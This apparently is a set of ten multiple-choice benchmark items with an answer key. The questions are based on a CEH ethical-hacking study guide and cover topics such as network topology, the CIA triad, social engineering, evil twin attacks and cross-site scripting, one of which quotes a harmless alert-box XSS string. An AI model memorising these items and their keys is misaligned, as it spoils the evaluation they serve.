index,question,options,answer_key
0,"Which network topology is described as a common hybrid approach for a large enterprise, connecting multiple switches together to form a backbone for the network?","{'A': 'Full mesh', 'B': 'Ring topology', 'C': 'Bus topology', 'D': 'Star-bus hybrid'}",D
1,"According to the provided study guide, what is the time limit and number of questions for the CEH v10 computerized exam?","{'A': '3 hours to complete 100 questions', 'B': '4 hours to complete 125 questions', 'C': '5 hours to complete 150 questions', 'D': '2 hours to complete 125 questions'}",B
2,"In the ethical hacking methodology described in the text, which phase involves identifying systems and the services running on them by using techniques like port scanning?","{'A': 'Gaining Access', 'B': 'Maintaining Access', 'C': 'Scanning and Enumeration', 'D': 'Reconnaissance and Footprinting'}",C
3,"In the context of the CIA triad, which principle ensures that information and services are available to authorized users when they are needed?","{'A': 'Confidentiality', 'B': 'Integrity', 'C': 'Authenticity', 'D': 'Availability'}",D
4,"What is the primary characteristic that distinguishes a worm from a virus, as detailed in the text?","{'A': 'A worm requires user intervention to spread.', 'B': 'A worm can self-propagate to other systems on its own.', 'C': 'A worm is always more destructive than a virus.', 'D': 'A worm cannot infect files, only systems.'}",B
5,"To capture network traffic from other systems on a modern switched network, which technique involves configuring a switch to forward a copy of packets from one port to another?","{'A': 'Port Mirroring/Spanning', 'B': 'ARP Spoofing', 'C': 'Using a passive hub', 'D': 'Running in promiscuous mode only'}",A
6,"An attacker, pretending to be from IT support, calls an employee and offers to fix a computer issue, thereby making the employee more willing to provide their login credentials. Which principle of social engineering is being primarily used?","{'A': 'Scarcity', 'B': 'Authority', 'C': 'Reciprocity', 'D': 'Social Proof'}",C
7,What is an 'Evil Twin' attack in the context of wireless security?,"{'A': 'A deauthentication attack that disconnects all users from a network.', 'B': 'A rogue access point configured with a legitimate-looking SSID to trick users into connecting.', 'C': 'A key reinstallation attack (KRACK) that forces a client to reuse a known key.', 'D': 'A bluesnarfing attack that steals data from a paired Bluetooth device.'}",B
8,"When an attacker injects code like `<script>alert('XSS');</script>` into a website's input field, causing it to be executed by a user's browser, what type of attack has occurred?","{'A': 'SQL Injection', 'B': 'Command Injection', 'C': 'Cross-Site Scripting (XSS)', 'D': 'Buffer Overflow'}",C
9,"Which cryptographic concept uses two mathematically related keys, a public key for encryption and a private key for decryption?","{'A': 'Symmetric key cryptography', 'B': 'Asymmetric key cryptography', 'C': 'Cryptographic hashing', 'D': 'Substitution ciphers'}",B
